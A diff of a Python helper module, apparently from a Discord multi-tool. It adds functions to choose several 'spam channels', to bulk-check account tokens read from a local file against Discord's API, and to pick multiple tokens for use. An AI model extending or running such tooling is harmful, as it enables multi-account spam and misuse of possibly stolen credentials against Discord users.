@@ -1,18 +1,19 @@
 from .Config import *
 
-import colorama
-import ctypes
-import subprocess
-import os
-import time
-import sys
-import datetime
-import sys
-import requests
-from PyQt5.QtWidgets import QApplication, QMainWindow, QLineEdit, QVBoxLayout, QWidget
-from PyQt5.QtGui import QIcon
-from PyQt5.QtCore import QUrl, Qt
-from PyQt5.QtWebEngineWidgets import QWebEngineView
+try:
+    import colorama
+    import ctypes
+    import subprocess
+    import os
+    import time
+    import sys
+    import datetime
+    import sys
+    import requests
+except Exception as e:
+    import os
+    print(f"[x] | Error Module (Restart Setup.bat): {e}")
+    os.system("pause")
 
 color_webhook = 0xa80505
 username_webhook = name_tool
@@ -29,11 +30,6 @@ try:
 except:
     username_pc = "username"
 
-def current_time_day_hour():
-    return datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-def current_time_hour():
-    return datetime.datetime.now().strftime('%H:%M:%S')
-
 INPUT = f'{red}[{white}>{red}] |'
 INFO = f'{red}[{white}!{red}] |'
 ERROR = f'{red}[{white}x{red}] |'
@@ -42,6 +38,11 @@ WAIT = f'{red}[{white}~{red}] |'
 
 GEN_VALID = f'{green}[{white}+{green}] |'
 GEN_INVALID = f'{red}[{white}x{red}] |'
+
+def current_time_day_hour():
+    return datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+def current_time_hour():
+    return datetime.datetime.now().strftime('%H:%M:%S')
 
 def ModuleInstall(module):
     subprocess.check_call(['pip', 'install', module])
@@ -66,6 +67,7 @@ def Reset():
         "LINUX"
         file = f'python3 ./Settings/Start.py'
         subprocess.run(file, shell=True)
+        
 def Clear():
     try:
         "WINDOWS"
@@ -89,7 +91,11 @@ def StartProgram(program):
 
 def Continue():
     input(color.RED + f"{INFO} Press to continue -> " + color.RESET)
-    
+
+def ErrorChoiceStart():
+    print(f"\n{color.RED}{ERROR} Invalid Choice !", color.RESET)
+    time.sleep(1)
+
 def ErrorChoice():
     print(f"{color.RED}{ERROR} Invalid Choice !", color.RESET)
     time.sleep(3)
@@ -135,11 +141,105 @@ def ErrorUsername():
     time.sleep(3)
     Reset()
 
+def ErrorModule(e):
+    print(f"{color.RED}{ERROR} Error Module (Restart Setup.bat): {white}{e}", color.RESET)
+    time.sleep(5)
+    Reset()
+
 def CheckWebhook(webhook):
     if webhook.lower().startswith("https://discord.com/api/webhooks"):
         pass
+    elif webhook.lower().startswith("http://discord.com/api/webhooks"):
+        pass
+    elif webhook.lower().startswith("https://canary.discord.com/api/webhooks"):
+        pass
+    elif webhook.lower().startswith("http://canary.discord.com/api/webhooks"):
+        pass
     else:
         ErrorWebhook()
+
+def ChoiceMultiChannelDiscord():
+    try:
+        num_channels = int(input(f"{INPUT} How many spam channels -> {reset}"))
+    except ValueError:
+        ErrorNumber()
+    
+    selected_channels = [] 
+    number = 0
+    for _ in range(num_channels):
+        try:
+            number += 1
+            selected_channel_number = input(f"{color.RED}{INPUT} Channel Id {number}/{num_channels} -> {color.RESET}")
+            selected_channels.append(selected_channel_number)
+        except:
+            ErrorId()
+
+    print(selected_channels)
+    return selected_channels
+
+
+def ChoiceMultiTokenDisord():
+    def CheckToken(token_number, token):
+        r = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
+        if r.status_code == 200:
+            status = f"Valid"
+            user = requests.get(
+                'https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
+            username_discord = user['username']
+            token_sensur = token[:-25] + '.' * 3
+            print(f"{white}[{red}{token_number}{white}]{red} -> {red}Status: {white}{status}{red} | User: {white}{username_discord}{red} | Token: {white}{token_sensur}")
+        else:
+            status = f"Invalid"
+            print(f"{white}[{red}{token_number}{white}]{red} -> {red}Status: {white}{status}{red} | {red}Token: {white}{token}")
+
+    file_token_discord = "./TokenDisc.txt"
+    tokens = {}
+    token_discord_number = 0
+
+    with open(file_token_discord, 'r') as file_token:
+        for line in file_token:
+            if not line.strip() or line.isspace():
+                continue
+            token_discord_number += 1
+        print(f"{INFO} {white}{token_discord_number}{red} Token found ({white}{file_token_discord}{red})")
+    
+    try:
+        num_tokens = int(input(f"{INPUT} How many token (max {token_discord_number}) -> {reset}"))
+        if num_tokens > token_discord_number:
+            ErrorNumber()
+    except:
+        ErrorNumber()
+
+    token_discord_number = 0
+    with open(file_token_discord, 'r') as file_token:
+        print()
+        print(f"{red}Token ({white}{file_token_discord}{red}):")
+        for line in file_token:
+            if not line.strip() or line.isspace():
+                continue
+    
+            token_discord_number += 1
+            modified_token = line.strip()
+            tokens[token_discord_number] = modified_token
+            CheckToken(token_discord_number, modified_token)
+    
+    number = 0
+    selected_tokens = []
+    print()
+    for _ in range(num_tokens):
+        try:
+            number += 1
+            selected_token_number = int(input(f"{color.RED}{INPUT} Token {number}/{num_tokens} -> {color.RESET}"))
+        except:
+            ErrorNumber()
+        
+        selected_token = tokens.get(selected_token_number)
+        if selected_token:
+            selected_tokens.append(selected_token)
+        else:
+            ErrorNumber()
+    return selected_tokens
+
 
 def Choice1TokenDiscord():
     def CheckToken(token_number, token):
@@ -149,7 +249,7 @@ def Choice1TokenDiscord():
             user = requests.get(
                 'https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
             username_discord = user['username']
-            token_sensur = token[:-10] + '*' * 10
+            token_sensur = token[:-25] + '.' * 3
             print(f"{white}[{red}{token_number}{white}]{red} -> {red}Status: {white}{status}{red} | User: {white}{username_discord}{red} | Token: {white}{token_sensur}")
         else:
             status = f"Invalid"
@@ -188,7 +288,16 @@ def Choice1TokenDiscord():
         ErrorChoice()
     return selected_token
 
+
 def BrowserPrivate(site, search_bar=True, title="Navigateur Web"):
+    try:
+        from PyQt5.QtWidgets import QApplication, QMainWindow, QLineEdit, QVBoxLayout, QWidget
+        from PyQt5.QtGui import QIcon
+        from PyQt5.QtCore import QUrl, Qt
+        from PyQt5.QtWebEngineWidgets import QWebEngineView
+    except Exception as e:
+        ErrorModule(e)
+
     class WebBrowserApp(QMainWindow):
         def __init__(self, url=None, width=1000, height=300, search_bar=True, title="Navigateur Web"):
             super().__init__()
